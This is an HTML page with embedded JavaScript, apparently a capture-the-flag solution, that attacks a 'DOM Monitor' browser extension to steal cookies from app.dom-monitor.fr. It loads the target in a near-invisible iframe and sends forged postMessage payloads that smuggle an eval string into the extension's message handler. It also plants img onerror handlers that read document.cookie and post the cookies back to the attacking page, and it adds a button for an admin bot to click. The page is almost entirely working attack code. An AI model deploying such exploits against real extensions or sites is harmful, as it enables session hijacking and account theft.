<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOM Monitor Cookie Theft - Targeted</title>
    <style>
        body {
            font-family: sans-serif;
            margin: 20px;
            line-height: 1.6;
        }
        #cookieResult {
            font-weight: bold;
            color: #d9534f;
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 4px;
            margin: 20px 0;
            min-height: 100px;
        }
        button {
            padding: 10px 15px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        #start {
            padding: 12px 20px;
            background-color: #28a745;
            font-size: 16px;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <h1>DOM Monitor Extension Cookie Theft</h1>
    <div id="cookieResult">Waiting for cookies...</div>
    
    <button id="exploitBtn">Run Targeted Exploit</button>
    
    <!-- Hidden iframe to load the target site -->
    <div id="frameContainer" style="height: 1px; overflow: hidden;"></div>
    
    <!-- Button that the bot clicks -->
    <button id="start">Start Automated Exploit</button>
    
    <script>
        // Target domain
        const targetDomain = "https://app.dom-monitor.fr";
        let stolenCookies = {};
        
        // Log to both console and page
        function log(message) {
            console.log(message);
            const result = document.getElementById("cookieResult");
            result.textContent = message;
        }
        
        // Create a hidden iframe with the target site
        function createTargetIframe() {
            log("Creating iframe for " + targetDomain);
            
            const container = document.getElementById("frameContainer");
            const iframe = document.createElement("iframe");
            iframe.src = targetDomain;
            iframe.id = "targetFrame";
            iframe.style.width = "1px";
            iframe.style.height = "1px";
            iframe.style.opacity = "0.01";
            container.appendChild(iframe);
            
            iframe.onload = function() {
                log("Target iframe loaded. Launching exploits...");
                runExploits();
            };
        }
        
        // Main exploit function
        function runExploits() {
            log("Running exploits against the extension...");
            
            // The most direct exploit: use postMessage to target the extension's event handler
            const cookieStealerScript = `
                (function() {
                    try {
                        // Steal cookies from the current domain (app.dom-monitor.fr)
                        const cookies = document.cookie;
                        console.log("COOKIES FOUND:", cookies);
                        
                        // Send cookies back to parent frame
                        window.parent.postMessage({
                            type: 'stolen_cookies',
                            cookies: cookies,
                            domain: window.location.hostname
                        }, '*');
                        
                        // Save cookies to localStorage as backup
                        localStorage.setItem('stolenCookies', cookies);
                        
                        return "Cookie theft successful: " + cookies;
                    } catch(e) {
                        console.error("Cookie theft failed:", e);
                        return "Error: " + e.toString();
                    }
                })();
            `;
            
            // Exploit method 1: Use the extension's postMessage vulnerability
            window.postMessage({
                action: "update_counts",
                domain: targetDomain,
                counts: {
                    fetch: 0,
                    innerHTML: 0,
                    setAttribute: 0,
                    eval: cookieStealerScript
                },
                resourceCounts: {}
            }, "*");
            
            // Exploit method 2: Try to inject via the extension's DOM monitoring
            try {
                // Create an element that will trigger the innerHTML monitor
                const div = document.createElement('div');
                div.innerHTML = `<img src="x" onerror="${cookieStealerScript.replace(/"/g, "'")}">`;
                document.body.appendChild(div);
                
                // Trigger the setAttribute monitor
                const img = document.createElement('img');
                img.setAttribute('onerror', cookieStealerScript.replace(/"/g, "'"));
                img.setAttribute('src', 'invalid-image-src');
                document.body.appendChild(img);
            } catch(e) {
                console.error("DOM injection failed:", e);
            }
            
            // Exploit method 3: Target the extension's background script message handler
            window.postMessage({
                action: "open_sidepanel",
                domain: "http://localhost"
            }, "*");
            
            log("All exploits launched. Waiting for cookies...");
        }
        
        // Listen for messages from our injected code
        window.addEventListener('message', function(event) {
            console.log("Message received:", event.data);
            
            if (event.data && event.data.type === 'stolen_cookies') {
                const cookies = event.data.cookies;
                const domain = event.data.domain;
                
                stolenCookies[domain] = cookies;
                log(`🍪 Cookies stolen from ${domain}: ${cookies}`);
                
                // Highlight the firstFlag if found
                if (cookies.includes('firstFlag=')) {
                    const flagMatch = cookies.match(/firstFlag=([^;]+)/);
                    if (flagMatch && flagMatch[1]) {
                        log(`🚩 FLAG FOUND! firstFlag=${flagMatch[1]}`);
                    }
                }
            }
        });
        
        // Button event listeners
        document.getElementById('exploitBtn').addEventListener('click', createTargetIframe);
        
        // Start button (for the bot)
        document.getElementById('start').addEventListener('click', function() {
            createTargetIframe();
            
            // Additional direct DOM-monitor extension exploit
            setTimeout(() => {
                // This targets the extension's core exploit vector
                const extensionExploit = `
                    // The extension removes CSP headers, which allows us to execute this script
                    (function() {
                        console.log("Extension exploit running...");
                        
                        // Try to steal cookies via direct DOM access
                        try {
                            const cookies = document.cookie;
                            console.log("Direct cookie access:", cookies);
                            
                            // Send to parent via postMessage
                            window.parent.postMessage({
                                type: 'stolen_cookies',
                                cookies: cookies,
                                domain: document.domain
                            }, '*');
                            return cookies;
                        } catch(e) {
                            console.error("Direct cookie access failed:", e);
                        }
                    })();
                `;
                
                // Send via the extension's message handler
                window.postMessage({
                    action: "update_counts",
                    domain: targetDomain,
                    counts: {
                        eval: extensionExploit
                    },
                    resourceCounts: {}
                }, "*");
            }, 2000);
        });
    </script>
</body>
</html>
